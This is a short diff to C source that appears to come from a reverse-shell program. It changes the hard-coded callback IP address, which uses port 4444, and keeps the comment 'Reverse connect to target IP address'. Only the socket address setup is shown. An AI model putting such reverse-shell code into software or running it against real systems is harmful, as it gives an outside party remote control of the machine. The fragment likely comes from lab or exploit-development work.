@@ -51,7 +51,7 @@ int main(void) {
     // IP address family
     serv_addr.sin_family = AF_INET;
     // Destination IP address
-    serv_addr.sin_addr.s_addr = inet_addr("192.168.0.142");
+    serv_addr.sin_addr.s_addr = inet_addr("192.168.0.143");
     // Destination port 
     serv_addr.sin_port = htons(4444);
     // Reverse connect to target IP address
